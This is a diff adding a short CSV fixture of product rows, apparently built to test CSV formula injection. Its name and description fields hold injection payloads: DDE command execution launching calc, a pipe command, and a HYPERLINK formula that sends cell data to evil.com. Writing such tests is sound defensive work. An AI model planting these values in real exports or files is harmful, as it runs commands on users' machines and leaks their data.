@@ -1,0 +1,7 @@
+name,sku,description,category,price,stock,weight_kg
+=cmd|'/C calc'!A0,FORM-001,Formula in name field,Electronics,19.99,10,0.5
+Normal Product,FORM-002,+cmd|'/C calc'!A0,Clothing,29.99,20,0.3
+Another Product,FORM-003,-1+1+cmd|'/C calc'!A0,Books,9.99,5,0.2
+@SUM(A1:A100),FORM-004,Formula function call,Food & Beverage,14.99,15,0.4
+|calc,FORM-005,Pipe command execution,Accessories,24.99,8,0.1
+=HYPERLINK("http://evil.com/steal?data="&A1),FORM-006,Data exfil via hyperlink,Tools,39.99,12,0.6
